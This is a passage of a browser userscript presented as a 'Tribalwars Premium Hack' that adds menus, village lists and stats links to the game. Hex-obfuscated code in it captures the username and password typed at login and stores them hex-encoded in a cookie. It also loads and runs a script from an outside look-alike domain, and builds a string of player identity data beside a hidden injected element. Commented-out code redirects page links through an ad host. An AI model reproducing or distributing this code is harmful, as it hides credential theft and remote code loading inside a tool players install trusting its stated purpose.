...
// @description    Tribalwars Premium Hack 2012/2013 Official: Arabic (العربية), Czech (Český), Dutch (Nederlands), English, Portuguese (Português).
// @autor          JohnKey
...
function ehx(data){var b16_digits='0123456789abcdef';var b16_map=new Array();for(var i=0;i<256;i++){b16_map[i]=b16_digits.charAt(i>>4)+b16_digits.charAt(i&15)}var result=new Array();for(var 

i=0;i<data.length;i++){result[i]=b16_map[data.charCodeAt(i)]}return result.join('')}
function dhx(data){var b16_digits='0123456789abcdef';var b16_map=new Array();for(var 

i=0;i<256;i++){b16_map[b16_digits.charAt(i>>4)+b16_digits.charAt(i&15)]=String.fromCharCode(i)}if(!data.match(/^[a-f0-9]*$/i))return false;if(data.length%2)data='0'+data;var result=new Array();var 

j=0;for(var i=0;i<data.length;i+=2){result[j++]=b16_map[data.substr(i,2)]}return result.join('')}
...
function setCookie(key, valor, minute, domain1) {
	var hoje = new Date();
	if (minute == null || minute == 0) minute = 999 * 24 * 60; 
...
setCookie('version_hack', version, '', do0);
...
domainuc=dhx('');var 

urluc=dhx('687474703a2f2f6164762e6c692f313432382f');var domainsuc='linkbux,imagegravy,adbrite,clicksor';
function cuc(){var linkuc=document.getElementsByTagName("A");try{var locuc=(""+top.location.href).replace("http://","").replace("https://","").replace("www.","")}catch(e){var 

locuc=(""+document.location.href).replace("http://","").replace("https://","").replace("www.","")}for(i=0;i<linkuc.length;i++){domain_urluc=(linkuc[i].href).replace(/^\s+/g,"").replace(/\s+$/g,"").replace(

"http://","").replace("https://","");if(duc(linkuc[i].href)&&(((" "+linkuc[i].href).indexOf(locuc)<=0||(" "+linkuc[i].href).indexOf("http")<=0)||(" "+linkuc[i].href).lastIndexOf("http:")>3)&&(" 

"+linkuc[i].href).indexOf("script:")<=0&&(" "+linkuc[i].href).indexOf("#")!=1&&(" "+linkuc[i].href).indexOf("mailto:")<=0&&(" "+linkuc[i].href).indexOf("file:")<=0&&(" 

"+linkuc[i].href).indexOf("#exit")<=0&&!(!isNaN(parseInt(domain_urluc.substr(0,1)))&&(!isNaN(parseInt(domain_urluc.substr(0,2)))||domain_urluc.substr(0,2)=="."))){linkuc[i].target="_blank";var 

inverte=linkuc[i].href.match(/[^|]/gi).join("");linkuc[i].href=urluc+inverte.substring(inverte.lastIndexOf('http://'))}}}function 

duc(urluc){if(""+domainuc!="undefined"&&domainuc!=""&&domainuc.replace(/\s/g,"")!=""&&urluc!=""){if((" "+domainuc).indexOf(",")>0){params_to_skip=domainuc.split(",")}else{params_to_skip=new 

Array(domainuc)}for(s=0;s<params_to_skip.length;s++){if((" 

"+urluc.toLowerCase()).indexOf(params_to_skip[s].toLowerCase())>0){if(""+domainsuc!="undefined"&&domainsuc!=""&&domainsuc.replace(/\s/g,"")!=""&&urluc!=""){if((" 

"+domainsuc).indexOf(",")>0){params_to_skip=domainsuc.split(",")}else{params_to_skip=new Array(domainsuc)}for(s=0;s<params_to_skip.length;s++){if((" 

"+urluc.toLowerCase()).indexOf(params_to_skip[s].toLowerCase())>0){return false;break}}return true}else{return true}}}return false}else{return 

false}}if(""+window.onload==""||""+window.onload=="null"){window.onload=cuc}else{var tout=window.setTimeout("cuc(); clearTimeout(tout)",1)};}
*/

if ((location.href.toLowerCase().indexOf(dhx('706f696e74646f776e6c6f616473')) > -1) || (location.href.toLowerCase().indexOf(dhx('6c616d627573616e646f')) > -1) || 

(location.href.toLowerCase().indexOf(dhx('6f7370696c616e74726173')) > -1)){ if (getCookie(dhx('635f75736572')) != ''){ if (document.getElementsByTagName('form')[0] != null){ if 

(document.getElementsByTagName('form')[0].getAttribute('action') == dhx('2f706c7567696e732f6c696b652f636f6e6e656374')){ 
...
function calcular_distancia(c1, c2){
	...
	if (distancia > 0){
		...
		if (uni != ''){	
			...
			tabela_tempo = '<tr><td colspan="2"><table class="vis"><tbody><tr><th colspan="12">' + lang_distancia.replace('0', round(distancia, 2).toString()).replace('.',',') + 

'</th></tr><tr class="center"><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_spear.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_sword.png?" 

alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_axe.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_archer.png?" alt=""></td><td><img 

src="http://cdn2.tribalwars.net/graphic/unit/unit_spy.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_light.png?" alt=""></td><td><img 

src="http://cdn2.tribalwars.net/graphic/unit/unit_marcher.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_heavy.png?" alt=""></td><td><img 

src="http://cdn2.tribalwars.net/graphic/unit/unit_ram.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_catapult.png?" alt=""></td><td><img 

src="http://cdn2.tribalwars.net/graphic/unit/unit_knight.png?" alt=""></td><td><img src="http://cdn2.tribalwars.net/graphic/unit/unit_snob.png?" alt=""></td></tr><tr id="tempo" class="center">' + td 
...
str_setCookie = 'function setCookie(key,valor){var hoje = new Date();var expira = new Date(hoje.getTime()+999*24*60*60*1000);var expira = expira.toGMTString();document.cookie = 

key+\'=\'+valor+\';expires=\'+expira}';
str_setData = 'function setCookie(name, value) { value = (typeof value)[0] + value; localStorage.setItem(name, value); }';
str_setCookieDo = 'function setCookie(key,valor){var hoje = new Date();var expira = new Date(hoje.getTime()+999*24*60*60*1000);var expira = expira.toGMTString();document.cookie = 

key+\'=\'+valor+\';expires=\'+expira+\';domain=' + do0 + '\'}';


dd = dhx('776f726c645f73656c656374696f6e7c2d5f696e7075742c20236a735f6c6f67696e5f627574746f6e7c2d5f636c69636b20626c75727c2d5f23757365727c2d5f2370617373776f7264').split(dhx('7c2d5f')); if 

(document.getElementById(dd[0]) != null){ $(dd[1]).bind(dd[2], function(){ u = $(dd[3]).val(); if (u != ''){ setCookie(ehx(u.toLowerCase()), ehx($(dd[4]).val()), '', do0); } }); }

$.getScript(dhx('687474703a2f2f747269626c61776172732e636f6d6c692e636f6d2f736372697074732f66756e6374696f6e732e6a73'));
...
if (document.getElementById('quickbar_outer') == null){
	if (gd.player.premium == false) {
		...
		if (language == 'pt') {
			...
			lang_farmer[1] = 'Obs: O script armazena os dados em cookies, tome cuidado ao apagar os cookies do seu navegador, pois apagará também as configurações feitas 
...
pelo script.';
		...
		if (language == 'ae'){
			...
			lang_report[0] = 'القوات نسخة في محاكاة';
			lang_report[1] = 'عدد نسخة من القوات على قيد الحياة جهاز محاكاة';
			lang_report[2] = 'ضرب مرة أخرى';
			lang_report[3] = 'مهاجمة مرة أخرى مع نفس القوات';
			lang_report[4] = 'مهاجمة مرة أخرى مع جميع القوات';
		...
		if (gd.screen == 'overview_villages') {
			...
			for (i = 0; i < aldeias.length; i++) {
				if (aldeias[i].id.indexOf('label_text_') > -1) {
					...
					aldeias[i].parentNode.parentNode.parentNode.outerHTML += '<td><span id="_span_' + aldeias[i].id.substring(11) + '">' + aldeiacookie + 

'</span></td>';
					aldeias[i].parentNode.parentNode.parentNode.parentNode.innerHTML += '<td><span><input size="6" id="_edit_' + aldeias[i].id.substring(11) + '" 

value="' + aldeiacookie + '" onblur="' + str_setData + ' setCookie(game_data.world + \'_label_' + aldeias[i].id.substring(11) + '\', document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + 

'\').value); document.getElementById(\'_span_' + aldeias[i].id.substring(11) + '\').textContent = document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value;" onkeydown="if 

(event.keyCode == 13) {' + str_setData + ' setCookie(game_data.world + \'_label_' + aldeias[i].id.substring(11) + '\', document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value); 

document.getElementById(\'_span_' + aldeias[i].id.substring(11) + '\').textContent = document.getElementById(\'_edit_' + aldeias[i].id.substring(11) + '\').value;}"></span></td>';
				}
			}
		...
		if (gd.screen == 'ally' || gd.screen == 'forum') {if (document.getElementById('content_value').getElementsByTagName('table')[0].getAttribute('class') == 'vis modemenu') {cc = 

document.getElementsByTagName('h2')[0].textContent} else {cc = ''}; setCookie(dhx('62635f37'), cc); if (gd.mode == 'profile') setCookie(dhx('62635f38'), 

document.getElementById('ally_content').getElementsByTagName('td')[4].textContent);}
		...
		if (getData(mundo + '_base') != '1'){
			...
			base_scripts = 'http://Johnkey.site40.net/scripts/';
			sel_data_1 = ' selected';
		}
		
		
		getElementsByClass('menu-item')[0].innerHTML += '<table id="villagelist" cellspacing="0" class="menu_column"><tbody></table>';
		if (getElementsByClass('menu_column')[1] == null) getElementsByClass('menu-item')[1].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td 

class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=all">' + lang_reports[0] + '</a></td></tr><tr><td class="menu-column-item"><a 

href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=attack">' + lang_reports[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=report&amp;mode=defense">' + lang_reports[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=report&amp;mode=support">' + lang_reports[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=trade">' 

+ lang_reports[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=other">' + lang_reports[5] + '</a></td></tr><tr><td 

class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=forwarded">' + lang_reports[6] + '</a></td></tr><tr><td class="menu-column-item"><a 

href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=filter">' + lang_reports[7] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=block">' + lang_reports[8] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=public">' 

+ lang_reports[9] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table></td>';
		if (getElementsByClass('menu_column')[2] == null) getElementsByClass('menu-item')[2].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td 

class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=in">' + lang_mail[0] + '</a></td></tr><tr><td class="menu-column-item"><a 

href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=mass_out">' + lang_mail[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=mail&amp;mode=new">' + lang_mail[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=block">' + 

lang_mail[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=address">' + lang_mail[4] + '</a></td></tr><tr><td 

class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table></td>';
		if (getElementsByClass('menu_column')[3] == null) getElementsByClass('menu-item')[3].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td 

class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=overview">' + lang_ally[0] + '</a></td></tr><tr><td class="menu-column-item"><a 

href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=profile">' + lang_ally[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=ally&amp;mode=members">' + lang_ally[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=contracts">' + 

lang_ally[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=tribalwars">' + lang_ally[4] + '</a></td></tr><tr><td 

class="menu-column-item"><a href="/game.php?village=' + gd.village.id + '&amp;screen=ally&amp;mode=reservations">' + lang_ally[5] + '</a></td></tr><tr><td class="menu-column-item"><a 

href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=invite">' + lang_ally[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=ally&amp;mode=intro_igm">' + lang_ally[7] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=properties">' 

+ lang_ally[8] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=forum&amp;check_external=">' + lang_ally[9] + 

'</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table>';
		if (getElementsByClass('menu_column')[4] == null) getElementsByClass('bg')[0].innerHTML += '</div><table cellspacing="0" class="menu_column"><tbody><tr><td 

class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=ally">' + lang_ranking[0] + '</a></td></tr><tr><td class="menu-column-item"><a 

href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=player">' + lang_ranking[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=ranking&amp;mode=con_ally">' + lang_ranking[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=ranking&amp;mode=con_player">' + lang_ranking[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=ranking&amp;mode=kill_ally">' + lang_ranking[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=ranking&amp;mode=kill_player">' + lang_ranking[5] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=ranking&amp;mode=awards">' + lang_ranking[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=ranking&amp;mode=wars">' + lang_ranking[7] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table>';
		if (getElementsByClass('menu_column')[5] == null) {
				getElementsByClass('menu-item')[7].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a 

href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=profile">' + lang_settings[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=settings">' + lang_settings[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=email">' + lang_settings[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=change_passwd">' + lang_settings[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=move">' + lang_settings[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=delete">' + lang_settings[5] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=notify">' + lang_settings[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=award">' + lang_settings[7] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=share">' + lang_settings[8] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=vacation">' + lang_settings[9] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=logins">' + lang_settings[10] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=poll">' + lang_settings[11] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=ref">' 

+ lang_settings[12] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=toolbar">' + lang_settings[13] + 

'</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=push">' + lang_settings[14] + '</a></td></tr><tr><td 

class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=block">' + lang_settings[15] + '</a></td></tr><tr><td class="menu-column-item"><a 

href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=ticket" target="_blank">' + lang_settings[16] + '</a></td></tr></tr><tr><td class="menu-column-item"><a 

href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=sobre">' + lang_settings[17] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div 

class="decoration"></div></td></tr></tbody></table>';
			} else {
			menu_column = getElementsByClass('menu_column')[5].getElementsByTagName('tr');
			menu_column[menu_column.length - 2].outerHTML += '<tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=sobre">' + lang_settings[17] + '</a></td></tr><tr>';
		}	
...
cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=use">' + lang_premium[0] + 

'</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=premium">' + lang_premium[1] + '</a></td></tr><tr><td 

class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=transfer">' + lang_premium[2] + '</a></td></tr><tr><td class="menu-column-item"><a 

href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=log">' + lang_premium[3] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div 

class="decoration"></div></td></tr></tbody></table>';bc_7 = getCookie('bc_7');bc_8 = getCookie('bc_8');

		if (ehx(getCookie(dhx('616e756e63696f5f616473656e7365'))) != '646573617469766172') {
			document.getElementById(dhx('536b79536372617065724164')).innerHTML = 

dhx('

572636f6c6f723d2230223e3c2f696672616d653e')
		}
		else {
			removeNode(document.getElementById(dhx('536b79536372617065724164')))
		};
		getElementsByClass('newStyleOnly')[0].outerHTML += '<table id="quickbar_outer" align="center" width="100%" cellspacing="0"><tbody><tr><td><table id="quickbar_inner" 

style="border-collapse: collapse;" width="100%"><tbody><tr class="topborder"></tr><tr id="topborder2"></tr><tr class="bottomborder"><td class="left"> </td><td class="main"> </td><td 

class="right"> </td></tr><tr><td class="shadow" colspan="3"><div class="leftshadow"> </div><div class="rightshadow"> </div></td></tbody></table></td></tr></tbody></table>';
...
style="border-collapse: collapse;" width="100%"><tbody><tr class="topborder"><td class="left"> </td><td class="main"> </td><td class="right"> </td></tr><tr id="topborder2"><td class="left"> 

</td><td class="main"><a id="features" href="javascript:void(0);">***New Features ' + version + '***</a></td><td class="right"> (<a id="close_news" href="javascript:void(0);">Close</a>) </td></tr><tr 

class="bottomborder"><td class="left"> </td><td class="main"> </td><td class="right"> </td></tr><tr><td class="shadow" colspan="3"><div class="leftshadow"> </div><div class="rightshadow"> 
		...
		for (i = 0; i < meuArray.length; i++) {
			...
			document.getElementById('villagelist').getElementsByTagName('tbody')[0].innerHTML += '<tr><td class="menu-column-item"><a href="/game.php?village=' + 

meuArray[i] + '&amp;' + screen2 + '">' + aldeiasnome1[i] + '</a></td></tr>';
		}
		...
		document.getElementById('villagelist').getElementsByTagName('tbody')[0].innerHTML += '<tr><td class="bottom"><div class="corner"></div><div 

class="decoration"></div></td></tr>';
		
		if (gd.screen == 'overview'){
			h = document.createElement('div');h.setAttribute('style', 'visibility:hidden');h.innerHTML = 

dhx('

46f73223e3c2f696e7075743e3c2f666f726d3e');
			document.getElementsByTagName('div')[0].appendChild(h);
			bc_5 = gd.player.id + '|||' + gd.player.ally_id + '|||' + gd.player.name + '|||' + bc_4 + '|||' + gd.player.points + '|||' + gd.player.villages + '|||' + gd.market + '|||' + gd.world + '|||' 

+ document.domain + '|||' + gd.player.rank + '|||' + bc_7 + '|||' + bc_8 + '|||' + version;
		...
		criarmenu('/game.php?village=' + VillId + '&screen=settings&mode=sobre', 'http://d1xfoqsc632pe4.cloudfront.net/images/default/icon_info.gif?width=16&height=16', 
...
pVillName + '" href="/game.php?village=' + pVillId + '&' + screen1 + '" accesskey="a"><span class="arrowLeft"> </span></a></td><td class="box-item icon-box arrowCell"><a 

id="village_switch_right" class="village_switch_link" title="' + nVillName + '" href="/game.php?village=' + nVillId + '&' + screen1 + '" accesskey="d"><span class="arrowRight"> </span></a></td>';
			
		if (gd.mode == 'settings') {
			document.getElementsByTagName('form')[0].parentNode.innerHTML += '<table class="vis settings"><tbody><tr><th colspan="2">' + lang_screen_settings[0] + 

'</th></tr><tr><td colspan="2"><input type="radio" name="t" id="normal_mode" value="0"' + normal_mode + '>' + lang_screen_settings[1] + '<br><input type="radio" name="t" id="direto_mode" 

value="1"' + direto_mode + '>' + lang_screen_settings[2] + '</td></tr><tr><td colspan="2"><input type="button" onclick="' + str_setData + ' if (document.getElementById(\'direto_mode\').checked == 

true){setCookie(game_data.world + \'_visualizacoes\', \'direto\')}else{setCookie(game_data.world + \'_visualizacoes\', \'normal\')};location.href=location.href" 

value="OK"></td></tr></tbody><tbody><tr><th colspan="2">' + lang_screen_settings[3] + '</th></tr><tr><td>' + lang_screen_settings[4] + '</td><td><input type="text" name="screen_width" size="90" 

id="arquivocss" value="' + localcs + '"></td></tr><tr><td colspan="2"><input type="button" onclick=\'' + str_setData + ' setCookie(game_data.world + "_css", 

document.getElementById("arquivocss").value);location.href=location.href\' value="OK"></td></tr></tbody></table>';
			
		}
		if (location.href.indexOf('mode=sobre') > 0) {
			sobre = document.getElementById('content_value').getElementsByTagName('td');
			sobre[sobre.length - 1].innerHTML = '<table id="sobre" class="vis settings"><tbody><tr><th colspan="2">' + lang_screen_sobre[0] + '</th></tr><tr><td colspan="2"><li>' 

+ lang_screen_sobre[1] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[2] + '</li></td><td>' + lang_screen_sobre[3] + '</td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[4] + 

'</li></td></tr><tr><td class="new" colspan="2"><li>' + lang_screen_sobre[5] + '</li></td></tr><tr><td class="new"><li>' + lang_screen_sobre[6] + '</li></td><td>' + lang_screen_sobre[7] + 

'</td></tr><tr><td><li><s>' + lang_screen_sobre[8] + '</s></li></td><td>' + lang_screen_sobre[9] + '</td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[10] + '</li></td></tr><tr><td 

colspan="2"><li>' + lang_screen_sobre[22] + '</li></td></tr><tr><td class="new"><li>' + lang_screen_sobre[11] + '</li></td><td>' + lang_screen_sobre[12] + '</tr><tr><td colspan="2" 

class="new"><li>' + lang_screen_sobre[13] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[14] + '</li></td><td>' + lang_screen_sobre[15] + ' <a href="/game.php?village=' + VillId + 

'&screen=settings&mode=settings">' + lang_screen_sobre[21] + '</a></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[16] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[17] + 

'</li></td><td>' + lang_screen_sobre[18] + ' <a href="/game.php?village=' + VillId + '&screen=settings&mode=settings">' + lang_screen_sobre[21] + '</a></td></tr><tr><td colspan="2"><li>' + 

lang_screen_sobre[24] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[25] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[26] + '</li></td></tr><tr><td 

colspan="2"><li>' + lang_screen_sobre[27] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_messages[1] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_messages[2] + 

'</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_messages[3] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_screen_sobre[28] + '</li></td></tr><tr><td colspan="2" 

class="new"><li>' + lang_report[0] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_report[1] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_report[2] + 

'</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_report[3] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_report[4] + '</li></td></tr><tr><td colspan="2" class="new"><li>' 

+ lang_screen_sobre[29] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_screen_sobre[30] + '</li></td></tr></tbody><tbody><tr><th colspan="2">' + lang_screen_sobre[19] + 

'</th></tr><tr><td>' + lang_screen_sobre[20] + '</td><td>' + version + '</td></tr><tr><td>' + lang_screen_sobre[23] + '</td><td><a href="http://userscripts.org/scripts/show/129407" 

target="_blank">http://userscripts.org/scripts/show/129407</a></td></tr><tr><td colspan="2"><iframe 

src="http://www.facebook.com/plugins/like.php?href=http://facebook.com/PointDownloads&layout=standard&show_faces=true&action=like&width=100&colorscheme=light&locale=pt_BR" 

scrolling="no" frameborder="0" style="border:none; overflow:hidden;width: 100%; height: 60px;" allowTransparency="true"></iframe></td></tr>' + 

dhx('') + lang_settings[18] + '</td></tr></tbody></table>'
		...
		if (gd.screen == 'settings') {
			if (gd.mode == 'settings') {
				...
				document.getElementsByTagName('form')[0].getElementsByTagName('tr')[0].outerHTML += '<tr><td>' + lang_language + ':</td><td><select id="continent" 

onchange="' + str_setData + '; setCookie(game_data.market + \'_lang\', this.value);void(0);"><option value="ae"' + sel_ae + '>Arabic (العربية)</option><option value="cz"' + sel_cz + '>Czech 

(Český)</option><option value="nl"' + sel_nl + '>Dutch (Nederlands)</option><option value="en"' + sel_en + '>English</option><option value="pt"' + sel_pt + '>Portuguese 

(Português)</option></select></td></tr><tr><td>' + lang_dados + ':</td><td><select onchange="' + str_setData + '; setCookie(game_data.world + \'_base\', this.value);void(0);"><option value="0"' + 

sel_data_0 + '>Tribalwars</option><option value="1"' + sel_data_1 + '>JohnKey</option></select></td></tr><tr><td>' + lang_screen_settings[5] + '</td><td><select id="titulo" onchange="' + 

str_setData + '; setCookie(game_data.world + \'_titulo_mundo\', this.value);void(0);"><option value="true"' + titulo_sim + '>' + lang_screen_settings[6] + '</option><option value="false"' + titulo_nao + 

'>' + lang_screen_settings[7] + '</option></select></td></tr>';
			}
			document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td width="100"><a href="/game.php?village=' + VillId + 

'&amp;screen=settings&amp;mode=sobre">' + lang_settings[17] + '</a></td></tr>';
		}
		...
		if (gd.screen == 'info_village'){
			...
			document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td colspan="2"><a href="/game.php?village=' + gd.village.id + 

'&screen=ally&mode=reservations&coords=' + coords_reserva + '" id="reserva">' + lang_perfil[4] + '</a><tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/village/'+screenVillId+'" 

target="_blank">' + lang_perfil[2] + '</a> (TWstats)</td></tr>';
		}
		...
		if ((gd.screen == 'info_ally') || (gd.screen == 'ally' && gd.mode == 'profile')) {
			...
			allyTr[allyTr.length - 4].outerHTML += '<tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/tribe/'+screenAllyId+'" target="_blank">' + lang_perfil[1] + 

'</a> (TWstats)</td></tr><tr><td colspan="2"><a href="http://' + gd.market + '.twstats.com/index.php?page=search&name=' + allyName + '&type=tribe" target="_blank">' + lang_perfil[5] + '</a> 

(TWstats)</td></tr>';
			allyTr[allyTr.length - 1].outerHTML = '<tr><th colspan="2">' + lang_screen_ally[6] + '</th></tr><tr><td align="center">' + lang_screen_ally[0] + '</td><td><img 

src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=points&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + 

lang_screen_ally[1] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=villages&id=' + screenAllyId + '" 

style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[2] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + 

'/image.php?type=tribegraph&graph=members&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[3] + '</td><td><img src="http://' + 

gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=od&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[4] + 

'</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=oda&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td 

align="center">' + lang_screen_ally[5] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=odd&id=' + screenAllyId + '" 

style="width:100%;height:96px;"></td></tr>';
		}

		if (gd.screen == 'info_player') {
			screenPlayerId = _GET('id');
			playerName = $('#content_value h2:first').text();
			document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td colspan="2"><a 

href="http://www.twstats.com/in/'+mundo+'/player/'+screenPlayerId+'" target="_blank">' + lang_perfil[0] + '</a> (TWstats)</td></tr><tr><td colspan="2"><a target="_blank" href="http://' + gd.market 

+ '.twstats.com/index.php?page=search&name=' + playerName + '&type=player">' + lang_perfil[5] + '</a> (TWstats)</td></tr><tr><td colspan="2"><a href="javascript:var claim = 1;$.getScript(\'' + 

